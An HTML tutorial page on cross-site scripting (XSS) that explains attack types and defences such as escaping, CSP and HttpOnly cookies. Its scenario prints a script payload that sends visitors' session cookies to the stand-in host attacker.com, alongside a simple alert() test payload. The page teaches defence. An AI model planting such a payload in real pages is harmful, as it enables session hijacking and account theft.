<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>

  <h1>💥 Cross-Site Scripting (XSS) – The Silent JavaScript Attack</h1>

  <h2>👶 For Beginners: What is XSS?</h2>
  <p>
    Imagine you visit a website and see a comment section where users can post messages. Now, what if a hacker posts this instead?
      <div class="highlight">
        <code>&lt;script&gt;alert("Hacked!");&lt;/script&gt;</code>
      </div>
  </p>

 
  <p>
    If the website doesn’t filter this input, the script executes in your browser, displaying a popup. But real attacks are much worse—they can steal your cookies, deface pages, or even hijack your account!
  </p>

  <p>
    💡 <strong>XSS</strong> happens when attackers inject malicious scripts into trusted websites, making your browser run them unknowingly.
  </p>

  <h2>🔍 Technical Explanation of XSS</h2>
  <p>
    Cross-Site Scripting (XSS) is a web vulnerability that allows attackers to inject and execute malicious JavaScript in a victim’s browser. This occurs when a website fails to sanitize user input before displaying it.
  </p>

  <div class="highlight">
    🚨 <strong>Types of XSS Attacks:</strong>
  </div>

  <ul>
    <li>✔️ <strong>Stored XSS</strong> – Malicious script is permanently saved in the website’s database and runs whenever someone views the infected page.</li>
    <li>✔️ <strong>Reflected XSS</strong> – The script is included in a URL or form input and runs when a user clicks a crafted link.</li>
    <li>✔️ <strong>DOM-Based XSS</strong> – The attack happens within the browser’s Document Object Model (DOM), modifying how the page behaves.</li>
  </ul>

  <div class="highlight">
    🚨 XSS is one of the most common web security vulnerabilities and is listed in the OWASP Top 10!
  </div>

  <h2>🚨 Real-World XSS Attack Example</h2>
  <h3>🛍️ Scenario: XSS in an E-Commerce Site</h3>
  <ol>
    <li>A hacker posts a malicious script in a product review:</li>
    <div class="highlight">
      <code>&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie;&lt;/script&gt;</code>
    </div>
    <li>When users visit the product page, their session cookies get sent to the attacker.</li>
    <li>The attacker hijacks their accounts and makes purchases on their behalf! 🛒💰</li>
  </ol>

  <div class="highlight">
    💡 <strong>Key Takeaway:</strong> If the website had proper input sanitization, it wouldn’t execute JavaScript from user input!
  </div>

  <h2>🛡️ How to Prevent XSS Attacks?</h2>
  <p>Developers must sanitize and validate user input to prevent XSS.</p>

  <h3>✔️ 1. Escape User Input</h3>
  <ul>
    <li>🔹 Use proper escaping techniques to neutralize special characters before rendering them.</li>
    <li>🔹 Example (in HTML): <code>&lt;script&gt;alert("Hacked!");&lt;/script&gt;</code></li>
  </ul>

  <h3>✔️ 2. Use Content Security Policy (CSP)</h3>
  <ul>
    <li>🔹 CSP restricts which scripts can run on a page, preventing unauthorized JavaScript execution.</li>
    <li>🔹 Example: <code>Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedsource.com</code></li>
  </ul>

  <h3>✔️ 3. Validate and Sanitize Input</h3>
  <ul>
    <li>🔹 Reject input that contains malicious characters like <code>&lt;script&gt;</code>, <code>onerror</code>, <code>eval()</code>.</li>
    <li>🔹 Use libraries like DOMPurify to clean user-generated content.</li>
  </ul>

  <h3>✔️ 4. Use HTTP-Only Cookies</h3>
  <ul>
    <li>🔹 Prevent JavaScript from accessing cookies by enabling the HttpOnly flag:</li>
    <div class="highlight">
      <code>Set-Cookie: sessionid=abc123; HttpOnly; Secure</code>
    </div>
  </ul>

  <h3>✔️ 5. Avoid Using innerHTML in JavaScript</h3>
  <ul>
    <li>🔹 Use safe methods like <code>textContent</code> instead of <code>innerHTML</code> to prevent script execution.</li>
  </ul>

  <h3>✔️ 6. Implement Web Application Firewalls (WAFs)</h3>
  <ul>
    <li>🔹 A WAF can detect and block malicious XSS attempts in real-time.</li>
  </ul>

  <h2>🚀 Final Thoughts</h2>
  <p>
    Cross-Site Scripting (XSS) is a powerful attack that allows hackers to execute scripts in a victim’s browser, leading to account takeovers, data theft, and phishing scams.
  </p>
  <p>
    💡 Developers must sanitize inputs, implement CSP, and use secure coding practices to eliminate XSS risks!
  </p>
  <p>
    By enforcing proper escaping, input validation, and security headers, we can stop XSS attacks and keep users safe.
  </p>

  <h3>🔐 Stay Secure, Stay Vigilant!</h3>

</body>
</html>
